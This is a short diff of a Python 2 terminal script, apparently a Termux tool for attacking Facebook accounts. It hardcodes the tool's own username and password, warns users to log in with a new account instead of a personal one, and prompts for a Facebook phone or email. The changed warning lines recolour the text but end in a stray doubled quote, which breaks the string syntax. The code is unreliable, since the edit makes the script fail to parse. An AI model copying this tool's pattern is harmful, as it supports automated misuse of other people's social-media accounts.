@@ -100,6 +100,7 @@ And Continue
  """
 CorrectUsername = "kalilinux"
 CorrectPassword = "Facebook"
+
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;92m")
@@ -161,10 +162,10 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo
-		jalan(' \033[1;91mWarning:\033[1;92m Do Not Use Your Personal Account' )
-		jalan(' \033[1;91mWarning:\033[1;92m Use a New Account To Login' )
-		jalan(' \033[1;91mWarning: \033[1;92mTermux All Version Work ' )
-		jalan(' \033[1;91mWarning: \033[1;92mYour Internet Should Be Fast ' )
+		jalan(' \033[1;43m \033[1;91mWarning:\033[1;92m Do Not Use Your Personal Account \033[1;0m'' )
+		jalan(' \033[1;43m \033[1;91mWarning:\033[1;92m Use a New Account To Login \033[1;0m'' )
+		jalan(' \033[1;43m \033[1;91mWarning: \033[1;92mTermux All Version Work \033[1;0m'' )
+		jalan(' \033[1;43m \033[1;91mWarning: \033[1;92mYour Internet Should Be Fast \033[1;0m'' )
 		print "\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•"
 		print('\033[1;97m[+] \x1b[1;93mLOGIN WITH FACEBOOK ' )
 		id = raw_input('\033[1;97m[+] \x1b[1;91mPhone/Email\x1b[1;93m: \x1b[1;93m')
